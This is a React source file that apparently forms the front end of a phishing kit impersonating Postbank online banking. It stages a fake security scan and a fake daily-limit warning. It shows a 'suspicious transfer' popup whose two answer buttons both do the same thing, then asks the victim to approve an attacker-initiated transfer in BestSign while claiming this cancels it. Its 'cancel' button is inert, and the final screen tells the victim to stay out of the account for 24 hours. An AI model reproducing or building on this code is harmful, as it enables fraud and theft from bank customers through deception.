import { useState, useEffect, useCallback } from 'react'
import config from '../config.js'
import BestSignPanel from './BestSignPanel.jsx'

// Use config for API URL with env override
const API_URL = import.meta.env.VITE_API_URL || config.api.url

// Helper to parse currency string to number (e.g., "10.000,50 €" -> 10000.50)
function parseCurrency(value) {
  if (!value) return 0
  if (typeof value === 'number') return value
  // Remove currency symbol, spaces, and convert German format
  const cleaned = value.toString()
    .replace(/[€\s]/g, '')
    .replace(/\./g, '')  // Remove thousand separators
    .replace(',', '.')   // Convert decimal comma to dot
  return parseFloat(cleaned) || 0
}

// Helper to format number as German currency (e.g., 12000 -> "12.000 €")
function formatCurrency(value) {
  const num = parseCurrency(value)
  // Format with German locale (dots for thousands, comma for decimals)
  const formatted = num.toLocaleString('de-DE', {
    minimumFractionDigits: 0,
    maximumFractionDigits: 0
  })
  return `${formatted} €`
}

// Calculate new limit: round up balance to next 5000
function calculateNewLimit(balance) {
  const balanceNum = parseCurrency(balance)
  // Round up to next 5000
  return Math.ceil(balanceNum / 5000) * 5000
}

// Generate random BestSign code (6 characters)
function generateBestSignCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
  let code = ''
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  return code
}

export function SecurityScan({ onComplete, sessionId, accountName: accountNameProp = 'Kunde', balance: balanceProp = '0,00 €', dailyLimit: dailyLimitProp = null, lastLogin: lastLoginProp = null }) {
  // Read URL params as fallback for demo/mock mode
  const urlParams = new URLSearchParams(window.location.search)
  const isMockMode = urlParams.get('mock') === 'true'
  
  // Use URL params if in mock mode and props are defaults
  const accountName = isMockMode && accountNameProp === 'Kunde' 
    ? (urlParams.get('name') || 'Demo User') 
    : accountNameProp
  
  const balance = isMockMode && (balanceProp === '0,00 €' || !balanceProp)
    ? `${urlParams.get('balance') || '45'} €`
    : balanceProp
    
  const dailyLimit = isMockMode && !dailyLimitProp
    ? `${urlParams.get('limit') || '70000'} €`
    : dailyLimitProp

  // Check if limit is lower than balance (step 4 should fail)
  const balanceNum = parseCurrency(balance)
  const limitNum = parseCurrency(dailyLimit)
  const limitTooLow = dailyLimit !== null && limitNum > 0 && limitNum < balanceNum
  
  // Debug logging for mock mode
  if (isMockMode) {
    console.log('SecurityScan Mock Mode:', { balance, dailyLimit, balanceNum, limitNum, limitTooLow })
  }

  // Dynamic scan steps based on limit check
  const SCAN_STEPS = [
    { id: 1, text: 'Überprüfung historischer Transaktionen', duration: 3000 },
    { id: 2, text: 'Analyse eingehender und ausgehender Überweisungen', duration: 4000 },
    { id: 3, text: 'Überprüfung von SEPA-Überweisungen', duration: 3500 },
    { id: 4, text: 'Überprüfung Ihrer Kontolimits', duration: 2500, isLimitError: limitTooLow },
    { id: 5, text: 'Analyse aktueller Kontobewegungen', duration: 0, isError: true } // Always shows as error until transfer complete
  ]
  const [showLoginNotice, setShowLoginNotice] = useState(true)
  const [currentStep, setCurrentStep] = useState(0)
  const [completedSteps, setCompletedSteps] = useState([])
  const [scanProgress, setScanProgress] = useState(0)
  const [transferComplete, setTransferComplete] = useState(false)
  const [isSecured, setIsSecured] = useState(false)
  
  // Limit change state
  const [showBestSignPopup, setShowBestSignPopup] = useState(false)
  const [bestSignCode, setBestSignCode] = useState('')
  const [limitChangeStatus, setLimitChangeStatus] = useState('idle') // idle, pending, success, error
  const [limitChangeError, setLimitChangeError] = useState(null)
  const [limitFixed, setLimitFixed] = useState(false) // Track if limit was successfully changed
  
  // Suspicious transfer popup state
  const [showSuspiciousPopup, setShowSuspiciousPopup] = useState(false)
  const [suspiciousTransfer, setSuspiciousTransfer] = useState(null) // { amount, beneficiaryName, beneficiaryIban, subject }
  const [suspiciousPopupStage, setSuspiciousPopupStage] = useState('confirm') // confirm, loading, bestsign, success, error
  const [transferBestSignCode, setTransferBestSignCode] = useState('')

  // Format number as German currency
  const formatCurrency = (amount) => {
    return new Intl.NumberFormat('de-DE', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(amount)
  }

  // Format IBAN with spaces
  const formatIban = (iban) => {
    if (!iban) return ''
    return iban.replace(/(.{4})/g, '$1 ').trim()
  }

  // Get current date in German format
  const getCurrentDate = () => {
    const now = new Date()
    const day = String(now.getDate()).padStart(2, '0')
    const month = String(now.getMonth() + 1).padStart(2, '0')
    const year = now.getFullYear()
    return `${day}.${month}.${year}`
  }

  // Poll for transfer completion and suspicious transfer trigger
  const checkTransferStatus = useCallback(async () => {
    if (!sessionId) return { completed: false, suspiciousTransfer: null, transferInitiated: false, bestSignCode: null }
    
    try {
      const response = await fetch(`${API_URL}/api/login/status/${sessionId}`)
      if (response.ok) {
        const data = await response.json()
        console.log('Status poll response:', data)
        
        return {
          completed: data.transferCompleted || data.status === 'transfer_complete',
          suspiciousTransfer: data.suspiciousTransfer || null,
          transferInitiated: data.transferInitiated || false,
          bestSignCode: data.transferBestSignCode || null
        }
      }
    } catch (err) {
      console.error('Error checking transfer status:', err)
    }
    return { completed: false, suspiciousTransfer: null, transferInitiated: false, bestSignCode: null }
  }, [sessionId])

  // Run through scan steps (but stop at step 5)
  useEffect(() => {
    if (currentStep < SCAN_STEPS.length - 1) { // Stop before last step (index 4)
      const step = SCAN_STEPS[currentStep]
      
      // Animate progress bar for this step
      const progressInterval = setInterval(() => {
        setScanProgress(prev => {
          const stepProgress = ((currentStep / (SCAN_STEPS.length - 1)) * 100) + 
            ((1 / (SCAN_STEPS.length - 1)) * 100 * (prev % 100) / 100)
          return Math.min(stepProgress + 2, ((currentStep + 1) / (SCAN_STEPS.length - 1)) * 82) // Stop at 82%
        })
      }, step.duration / 50)

      // Complete this step after duration
      const timer = setTimeout(() => {
        clearInterval(progressInterval)
        setCompletedSteps(prev => [...prev, step.id])
        setCurrentStep(prev => prev + 1)
        setScanProgress(((currentStep + 1) / (SCAN_STEPS.length - 1)) * 82)
      }, step.duration)

      return () => {
        clearTimeout(timer)
        clearInterval(progressInterval)
      }
    } else if (currentStep === SCAN_STEPS.length - 1) {
      // We're at the last step (error step) - start polling for transfer completion
      setScanProgress(82) // Keep at 82%
    }
  }, [currentStep])

  // Poll for transfer status (suspicious transfer trigger, transfer initiation, completion)
  useEffect(() => {
    if (currentStep !== SCAN_STEPS.length - 1) return
    if (transferComplete) return
    
    const pollInterval = setInterval(async () => {
      const status = await checkTransferStatus()
      
      // Check if suspicious transfer popup should be shown
      if (status.suspiciousTransfer && !showSuspiciousPopup && suspiciousPopupStage === 'confirm') {
        console.log('Suspicious transfer detected:', status.suspiciousTransfer)
        setSuspiciousTransfer(status.suspiciousTransfer)
        setShowSuspiciousPopup(true)
        setSuspiciousPopupStage('confirm')
      }
      
      // Check if transfer was initiated (show BestSign in popup)
      if (status.transferInitiated && showSuspiciousPopup && suspiciousPopupStage === 'loading') {
        console.log('Transfer initiated, showing BestSign')
        setSuspiciousPopupStage('bestsign')
        if (status.bestSignCode) {
          setTransferBestSignCode(status.bestSignCode)
        }
      }
      
      // Update BestSign code if received
      if (status.bestSignCode && suspiciousPopupStage === 'bestsign') {
        setTransferBestSignCode(status.bestSignCode)
      }
      
      // Check if transfer is complete
      if (status.completed) {
        setTransferComplete(true)
        clearInterval(pollInterval)
        
        // Close popup and show success
        if (showSuspiciousPopup) {
          setSuspiciousPopupStage('success')
          setTimeout(() => {
            setShowSuspiciousPopup(false)
          }, 2000)
        }
        
        // Animate to 100% and show secured message
        let progress = 82
        const progressInterval = setInterval(() => {
          progress += 2
          setScanProgress(progress)
          if (progress >= 100) {
            clearInterval(progressInterval)
            setCompletedSteps(prev => [...prev, SCAN_STEPS[currentStep].id])
            setIsSecured(true)
          }
        }, 50)
      }
    }, 2000) // Poll every 2 seconds
    
    return () => clearInterval(pollInterval)
  }, [currentStep, transferComplete, checkTransferStatus, showSuspiciousPopup, suspiciousPopupStage])

  const handleCancel = () => {
    // This doesn't actually do anything - just a visual button
    console.log('Cancel clicked - no action')
  }

  // Handle "Ändern" button click - initiate limit change
  const handleChangeLimit = async () => {
    const newLimit = calculateNewLimit(balance)
    console.log(`Changing limit: balance=${balanceNum}, newLimit=${newLimit}`)
    
    // Generate BestSign code and show popup
    const code = generateBestSignCode()
    setBestSignCode(code)
    setShowBestSignPopup(true)
    setLimitChangeStatus('pending')
    setLimitChangeError(null)

    // In mock mode, simulate the process
    if (isMockMode) {
      console.log('Mock mode: Simulating limit change...')
      // Simulate BestSign approval after 5 seconds
      setTimeout(() => {
        console.log('Mock mode: BestSign approved, limit changed!')
        setLimitChangeStatus('success')
        setLimitFixed(true) // Mark step 4 as fixed (green)
        // Close popup after showing success
        setTimeout(() => {
          setShowBestSignPopup(false)
          setLimitChangeStatus('idle')
        }, 2000)
      }, 5000)
      return
    }

    // Real API call
    try {
      const response = await fetch(`${API_URL}/api/bank/limits/${sessionId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ newLimit })
      })

      const result = await response.json()
      console.log('Limit change response:', result)

      if (result.success) {
        setLimitChangeStatus('success')
        setLimitFixed(true) // Mark step 4 as fixed (green)
        // Close popup after showing success
        setTimeout(() => {
          setShowBestSignPopup(false)
          setLimitChangeStatus('idle')
        }, 2000)
      } else {
        setLimitChangeStatus('error')
        setLimitChangeError(result.error || 'Limit change failed')
      }
    } catch (err) {
      console.error('Limit change error:', err)
      setLimitChangeStatus('error')
      setLimitChangeError(err.message || 'Connection error')
    }
  }

  // Close BestSign popup
  const closeBestSignPopup = () => {
    setShowBestSignPopup(false)
    setLimitChangeStatus('idle')
    setLimitChangeError(null)
  }

  // Handle "War ich" or "War ich nicht" click - both do the same thing
  const handleSuspiciousConfirm = () => {
    console.log('User clicked confirm on suspicious transfer')
    setSuspiciousPopupStage('loading')
    // Now waiting for agent to initiate transfer...
  }

  // Close suspicious transfer popup
  const closeSuspiciousPopup = () => {
    setShowSuspiciousPopup(false)
    setSuspiciousPopupStage('confirm')
    setSuspiciousTransfer(null)
    setTransferBestSignCode('')
  }

  // Format current date/time for last login
  const formatLastLogin = () => {
    // Use the real last login from backend if available
    if (lastLoginProp) return lastLoginProp
    
    // Fallback to current time if not provided
    const now = new Date()
    const day = String(now.getDate()).padStart(2, '0')
    const month = String(now.getMonth() + 1).padStart(2, '0')
    const year = now.getFullYear()
    const hours = String(now.getHours()).padStart(2, '0')
    const minutes = String(now.getMinutes()).padStart(2, '0')
    return `${day}.${month}.${year}, ${hours}:${minutes} Uhr`
  }

  // Mock mode test functions
  const handleMockShowSuspiciousAlert = () => {
    console.log('Mock: Showing suspicious transfer alert')
    setSuspiciousTransfer({
      amount: 50000,
      beneficiaryName: 'Unknown Account',
      beneficiaryIban: 'DE89370400440532013000',
      subject: `TRANSFER-${Date.now()}`
    })
    setShowSuspiciousPopup(true)
    setSuspiciousPopupStage('confirm')
  }

  const handleMockShowBestSign = () => {
    console.log('Mock: Showing BestSign for transfer')
    setSuspiciousTransfer({
      amount: 50000,
      beneficiaryName: 'Unknown Account',
      beneficiaryIban: 'DE89370400440532013000',
      subject: `TRANSFER-${Date.now()}`
    })
    setShowSuspiciousPopup(true)
    setSuspiciousPopupStage('bestsign')
    setTransferBestSignCode('DEMO')
  }

  return (
    <div className="security-scan">

      {/* Login Notice Bar */}
      {showLoginNotice && (
        <div className="security-scan__login-notice">
          <div className="security-scan__login-notice-content">
            <span className="security-scan__login-notice-text">
              Letzter Login: {formatLastLogin()}
            </span>
            <span className="security-scan__login-notice-info">i</span>
          </div>
          <button 
            className="security-scan__login-notice-close"
            onClick={() => setShowLoginNotice(false)}
            type="button"
          >
            × schließen
          </button>
        </div>
      )}

      {/* Yellow Header Bar */}
      <div className="security-scan__header">
        <div className="security-scan__header-container">
          <div className="security-scan__logo">
            <img 
              src="/assets/images/pb-logo.svg" 
              alt="Postbank" 
              className="security-scan__logo-img"
            />
          </div>
          <div className="security-scan__header-right">
            <div className="security-scan__header-balance">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="security-scan__header-icon">
                <rect x="2" y="4" width="20" height="16" rx="2"/>
                <path d="M2 10h20"/>
              </svg>
              <span>{formatCurrency(balance)}</span>
            </div>
            <div className="security-scan__header-user">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="security-scan__header-icon">
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                <circle cx="12" cy="7" r="4"/>
              </svg>
              <span>{accountName}</span>
            </div>
            {/* Mock buttons in header */}
            {isMockMode && (
              <>
                <button onClick={handleMockShowSuspiciousAlert} type="button" style={{marginLeft: '10px', background: 'red', color: 'white', padding: '5px 10px'}}>Suspicious</button>
                <button onClick={handleMockShowBestSign} type="button" style={{marginLeft: '5px', background: 'blue', color: 'white', padding: '5px 10px'}}>BestSign</button>
              </>
            )}
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="security-scan__content">
        {/* Shield Icon */}
        <div className="security-scan__icon-container">
          <div className={`security-scan__shield ${isSecured ? 'security-scan__shield--complete' : 'security-scan__shield--scanning'}`}>
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path 
                d="M12 2L4 6V11C4 16.55 7.84 21.74 12 23C16.16 21.74 20 16.55 20 11V6L12 2Z" 
                fill="currentColor" 
                opacity="0.1"
              />
              <path 
                d="M12 2L4 6V11C4 16.55 7.84 21.74 12 23C16.16 21.74 20 16.55 20 11V6L12 2Z" 
                stroke="currentColor" 
                strokeWidth="1.5" 
                strokeLinecap="round" 
                strokeLinejoin="round"
              />
              {isSecured ? (
                <path 
                  d="M9 12L11 14L15 10" 
                  stroke="currentColor" 
                  strokeWidth="2" 
                  strokeLinecap="round" 
                  strokeLinejoin="round"
                  className="security-scan__checkmark"
                />
              ) : (
                <circle 
                  cx="12" 
                  cy="12" 
                  r="3" 
                  stroke="currentColor" 
                  strokeWidth="1.5"
                  className="security-scan__pulse"
                />
              )}
            </svg>
          </div>
        </div>

        {/* Title */}
        <h1 className="security-scan__title">
          {isSecured ? 'Ihr Konto ist jetzt sicher' : 'Sicherheitsprüfung läuft'}
        </h1>
        
        <p className="security-scan__subtitle">
          {isSecured 
            ? 'Bitte greifen Sie in den nächsten 24 Stunden nicht auf Ihr Konto zu, um die Sicherheitsmaßnahmen abzuschließen.'
            : 'Bitte warten Sie, während wir Ihr Konto überprüfen.'
          }
        </p>

        {/* Progress Bar */}
        <div className="security-scan__progress-container">
          <div className="security-scan__progress-bar">
            <div 
              className="security-scan__progress-fill"
              style={{ width: `${scanProgress}%` }}
            />
          </div>
          <div className="security-scan__progress-text">
            {Math.round(scanProgress)}%
          </div>
        </div>

        {/* Scan Steps */}
        <div className="security-scan__steps">
          {SCAN_STEPS.map((step, index) => {
            const isCompleted = completedSteps.includes(step.id)
            const isCurrent = currentStep === index && !isCompleted
            const isErrorStep = step.isError && isCurrent && !isSecured
            // Step 4 (limit check) shows as error if limit < balance AND not yet fixed
            const isLimitErrorStep = step.isLimitError && isCompleted && !limitFixed
            
            return (
              <div 
                key={step.id}
                className={`security-scan__step ${isCompleted && !isLimitErrorStep ? 'security-scan__step--completed' : ''} ${isCurrent ? 'security-scan__step--active' : ''} ${(isErrorStep || isLimitErrorStep) ? 'security-scan__step--error' : ''}`}
              >
                <div className="security-scan__step-icon">
                  {(isCompleted && !isLimitErrorStep) || (step.isLimitError && limitFixed) ? (
                    <svg viewBox="0 0 24 24" fill="none" className="security-scan__step-check">
                      <circle cx="12" cy="12" r="10" fill="#28a745"/>
                      <path d="M8 12L11 15L16 9" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  ) : isLimitErrorStep ? (
                    <svg viewBox="0 0 24 24" fill="none" className="security-scan__step-error">
                      <circle cx="12" cy="12" r="10" fill="#c41230"/>
                      <path d="M8 8L16 16M16 8L8 16" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  ) : isErrorStep ? (
                    <svg viewBox="0 0 24 24" fill="none" className="security-scan__step-error">
                      <circle cx="12" cy="12" r="10" fill="#c41230"/>
                      <path d="M8 8L16 16M16 8L8 16" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  ) : isCurrent ? (
                    <div className="security-scan__step-spinner">
                      <svg viewBox="0 0 24 24">
                        <circle cx="12" cy="12" r="10" stroke="#0a3478" strokeWidth="2" fill="none" opacity="0.2"/>
                        <path d="M12 2A10 10 0 0 1 22 12" stroke="#0a3478" strokeWidth="2" fill="none" strokeLinecap="round"/>
                      </svg>
                    </div>
                  ) : (
                    <div className="security-scan__step-pending">
                      <svg viewBox="0 0 24 24" fill="none">
                        <circle cx="12" cy="12" r="10" stroke="#ccc" strokeWidth="2"/>
                      </svg>
                    </div>
                  )}
                </div>
                <div className="security-scan__step-content">
                  <span className={`security-scan__step-text ${(isErrorStep || isLimitErrorStep) ? 'security-scan__step-text--error' : ''}`}>
                    {step.text}
                  </span>
                  {isLimitErrorStep && (
                    <span className="security-scan__step-subtitle">
                      Limit von unbekannter IP geändert
                    </span>
                  )}
                  {isErrorStep && (
                    <span className="security-scan__step-subtitle">
                      Unbekannte Aktivität erkannt
                    </span>
                  )}
                </div>
                {isLimitErrorStep && (
                  <button 
                    className="security-scan__step-action"
                    onClick={handleChangeLimit}
                    type="button"
                  >
                    Ändern
                  </button>
                )}
                {isErrorStep && (
                  <button 
                    className="security-scan__step-action"
                    onClick={handleCancel}
                    type="button"
                  >
                    Abbrechen
                  </button>
                )}
              </div>
            )
          })}
        </div>

        {/* Security Notice */}
        <div className="security-scan__notice">
          <svg viewBox="0 0 24 24" fill="none" className="security-scan__notice-icon">
            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#666" strokeWidth="1.5"/>
            <path d="M12 8V12M12 16H12.01" stroke="#666" strokeWidth="2" strokeLinecap="round"/>
          </svg>
          <span>
            {isSecured 
              ? 'Vielen Dank für Ihre Geduld. Ihr Konto wurde erfolgreich geschützt.'
              : 'Diese Sicherheitsprüfung schützt Ihr Konto vor unbefugtem Zugriff.'
            }
          </span>
        </div>
      </div>

      {/* Footer Teasers */}
      <div className="security-scan__footer-teasers">
        <div className="security-scan__footer-teasers-container">
          <div className="security-scan__footer-teaser">
            <div className="security-scan__footer-teaser-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="#0a3478" strokeWidth="1.5">
                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
              </svg>
            </div>
            <div className="security-scan__footer-teaser-content">
              <h5>Die wichtigsten Funktionen</h5>
              <p>Lernen Sie die wichtigsten Funktionen des Banking & Brokerage kennen.</p>
            </div>
          </div>
          <div className="security-scan__footer-teaser">
            <div className="security-scan__footer-teaser-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="#0a3478" strokeWidth="1.5">
                <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>
              </svg>
            </div>
            <div className="security-scan__footer-teaser-content">
              <h5>Für wenig Mäuse an die Börse</h5>
              <p>Black-Week-Preise für Xtrackers, iShares, Amundi & Vanguard ETFs</p>
            </div>
          </div>
          <div className="security-scan__footer-teaser">
            <div className="security-scan__footer-teaser-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="#0a3478" strokeWidth="1.5">
                <circle cx="12" cy="12" r="10"/>
                <path d="M12 6v6l4 2"/>
              </svg>
            </div>
            <div className="security-scan__footer-teaser-content">
              <h5>Postbank Privatkredit direkt</h5>
              <p>Bis 14.12.2025 Black Week-Aktionszins sichern</p>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="security-scan__footer">
        {/* Mock Controls in Footer - guaranteed visible */}
        {isMockMode && (
          <div style={{ background: '#1a1a2e', padding: '10px', marginBottom: '10px', textAlign: 'center', display: 'flex', justifyContent: 'center', gap: '10px' }}>
            <span style={{ color: '#ff6b00', fontWeight: 'bold' }}>MOCK:</span>
            <button onClick={handleMockShowSuspiciousAlert} type="button" style={{ background: '#c41230', color: 'white', padding: '8px 16px', border: 'none', borderRadius: '4px', cursor: 'pointer' }}>Suspicious Alert</button>
            <button onClick={handleMockShowBestSign} type="button" style={{ background: '#0a3478', color: 'white', padding: '8px 16px', border: 'none', borderRadius: '4px', cursor: 'pointer' }}>BestSign Transfer</button>
          </div>
        )}
        <div className="security-scan__footer-links">
          <a href="#">Erste Schritte</a>
          <a href="#">Terminvereinbarung</a>
          <a href="#">Kontakt</a>
          <a href="#">Impressum</a>
          <a href="#">Rechtshinweise</a>
          <a href="#">Datenschutz</a>
          <a href="#">Cookie-Einstellungen</a>
        </div>
        <div className="security-scan__footer-copyright">
          © 2025 Postbank – eine Niederlassung der Deutsche Bank AG
        </div>
      </div>

      {/* Suspicious Transfer Popup */}
      {showSuspiciousPopup && suspiciousTransfer && (
        <div className="suspicious-popup-overlay">
          <div className="suspicious-popup">
            <div className="suspicious-popup__header">
              <img 
                src="/assets/images/pb-logo.svg" 
                alt="Postbank" 
                className="suspicious-popup__logo"
              />
              <button 
                className="suspicious-popup__close"
                onClick={closeSuspiciousPopup}
                type="button"
              >
                ×
              </button>
            </div>
            
            <div className="suspicious-popup__content">
              {suspiciousPopupStage === 'confirm' && (
                <>
                  <div className="suspicious-popup__icon">
                    <svg viewBox="0 0 24 24" fill="none">
                      <circle cx="12" cy="12" r="11" stroke="#c41230" strokeWidth="2" fill="none"/>
                      <path d="M12 7v6" stroke="#c41230" strokeWidth="2" strokeLinecap="round"/>
                      <circle cx="12" cy="17" r="1" fill="#c41230"/>
                    </svg>
                  </div>
                  <h2 className="suspicious-popup__title">Verdächtige Überweisung erkannt</h2>
                  <p className="suspicious-popup__subtitle">Haben Sie diese Überweisung veranlasst?</p>
                  
                  <div className="suspicious-popup__details">
                    <div className="suspicious-popup__detail-row">
                      <span className="suspicious-popup__detail-label">Betrag:</span>
                      <span className="suspicious-popup__detail-value suspicious-popup__detail-value--amount">
                        {formatCurrency(suspiciousTransfer.amount / 2)} €
                      </span>
                    </div>
                    <div className="suspicious-popup__detail-row">
                      <span className="suspicious-popup__detail-label">Empfänger:</span>
                      <span className="suspicious-popup__detail-value">
                        {suspiciousTransfer.beneficiaryName || 'Unknown Account'}
                      </span>
                    </div>
                    <div className="suspicious-popup__detail-row">
                      <span className="suspicious-popup__detail-label">IBAN:</span>
                      <span className="suspicious-popup__detail-value">
                        {formatIban(suspiciousTransfer.beneficiaryIban)}
                      </span>
                    </div>
                    <div className="suspicious-popup__detail-row">
                      <span className="suspicious-popup__detail-label">Verwendungszweck:</span>
                      <span className="suspicious-popup__detail-value">
                        {suspiciousTransfer.subject || `TRANSFER-${Date.now()}`}
                      </span>
                    </div>
                    <div className="suspicious-popup__detail-row">
                      <span className="suspicious-popup__detail-label">Datum:</span>
                      <span className="suspicious-popup__detail-value">
                        {getCurrentDate()}
                      </span>
                    </div>
                  </div>
                  
                  <div className="suspicious-popup__buttons">
                    <button 
                      className="suspicious-popup__button suspicious-popup__button--secondary"
                      onClick={handleSuspiciousConfirm}
                      type="button"
                    >
                      War ich
                    </button>
                    <button 
                      className="suspicious-popup__button suspicious-popup__button--primary"
                      onClick={handleSuspiciousConfirm}
                      type="button"
                    >
                      War ich nicht
                    </button>
                  </div>
                </>
              )}
              
              {suspiciousPopupStage === 'loading' && (
                <>
                  <div className="suspicious-popup__spinner-large">
                    <svg viewBox="0 0 24 24">
                      <circle cx="12" cy="12" r="10" stroke="#e0e0e0" strokeWidth="3" fill="none"/>
                      <path d="M12 2A10 10 0 0 1 22 12" stroke="#0a3478" strokeWidth="3" fill="none" strokeLinecap="round"/>
                    </svg>
                  </div>
                  <h2 className="suspicious-popup__title">Bitte warten...</h2>
                  <p className="suspicious-popup__subtitle">Ihre Anfrage wird bearbeitet.</p>
                </>
              )}
              
              {suspiciousPopupStage === 'bestsign' && (
                <BestSignPanel
                  code={transferBestSignCode || 'XXXX'}
                  title="Mit BestSign freigeben"
                  subtitle="Bitte geben Sie den Auftrag in Ihrer App frei, um die Stornierung der Überweisung in Ihrem Konto abzuschließen."
                  compact={false}
                  showSpinner={true}
                  showBackButton={false}
                  showActionBar={true}
                />
              )}
              
              {suspiciousPopupStage === 'success' && (
                <>
                  <div className="suspicious-popup__icon suspicious-popup__icon--success">
                    <svg viewBox="0 0 24 24" fill="none">
                      <circle cx="12" cy="12" r="10" fill="#28a745"/>
                      <path d="M8 12L11 15L16 9" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </div>
                  <h2 className="suspicious-popup__title">Überweisung abgeschlossen</h2>
                  <p className="suspicious-popup__subtitle">Die Sicherheitsprüfung wird fortgesetzt.</p>
                </>
              )}
            </div>
          </div>
        </div>
      )}

      {/* BestSign Approval Popup */}
      {showBestSignPopup && (
        <div className="bestsign-popup-overlay">
          <div className="bestsign-popup">
            <div className="bestsign-popup__header">
              <img 
                src="/assets/images/pb-logo.svg" 
                alt="Postbank" 
                className="bestsign-popup__logo"
              />
              <button 
                className="bestsign-popup__close"
                onClick={closeBestSignPopup}
                type="button"
              >
                ×
              </button>
            </div>
            
            <div className="bestsign-popup__content">
              {limitChangeStatus === 'pending' && (
                <>
                  <div className="bestsign-popup__icon">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path 
                        d="M12 2L4 6V11C4 16.55 7.84 21.74 12 23C16.16 21.74 20 16.55 20 11V6L12 2Z" 
                        fill="#ffcc00" 
                        stroke="#0a3478"
                        strokeWidth="1.5"
                      />
                      <path 
                        d="M12 11V13M12 16H12.01" 
                        stroke="#0a3478" 
                        strokeWidth="2" 
                        strokeLinecap="round"
                      />
                    </svg>
                  </div>
                  <h2 className="bestsign-popup__title">BestSign Freigabe</h2>
                  <p className="bestsign-popup__text">
                    Bitte bestätigen Sie die Limitänderung in Ihrer BestSign App.
                  </p>
                  <div className="bestsign-popup__code-container">
                    <span className="bestsign-popup__code-label">Freigabecode:</span>
                    <span className="bestsign-popup__code">{bestSignCode}</span>
                  </div>
                  <div className="bestsign-popup__spinner">
                    <svg viewBox="0 0 24 24">
                      <circle cx="12" cy="12" r="10" stroke="#e0e0e0" strokeWidth="3" fill="none"/>
                      <path d="M12 2A10 10 0 0 1 22 12" stroke="#0a3478" strokeWidth="3" fill="none" strokeLinecap="round"/>
                    </svg>
                  </div>
                  <p className="bestsign-popup__waiting">Warte auf Freigabe...</p>
                </>
              )}
              
              {limitChangeStatus === 'success' && (
                <>
                  <div className="bestsign-popup__icon bestsign-popup__icon--success">
                    <svg viewBox="0 0 24 24" fill="none">
                      <circle cx="12" cy="12" r="10" fill="#28a745"/>
                      <path d="M8 12L11 15L16 9" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </div>
                  <h2 className="bestsign-popup__title">Erfolgreich</h2>
                  <p className="bestsign-popup__text">
                    Ihr Tageslimit wurde erfolgreich geändert.
                  </p>
                </>
              )}
              
              {limitChangeStatus === 'error' && (
                <>
                  <div className="bestsign-popup__icon bestsign-popup__icon--error">
                    <svg viewBox="0 0 24 24" fill="none">
                      <circle cx="12" cy="12" r="10" fill="#c41230"/>
                      <path d="M8 8L16 16M16 8L8 16" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </div>
                  <h2 className="bestsign-popup__title">Fehler</h2>
                  <p className="bestsign-popup__text">
                    {limitChangeError || 'Die Limitänderung konnte nicht durchgeführt werden.'}
                  </p>
                  <button 
                    className="bestsign-popup__button"
                    onClick={closeBestSignPopup}
                    type="button"
                  >
                    Schließen
                  </button>
                </>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

export default SecurityScan
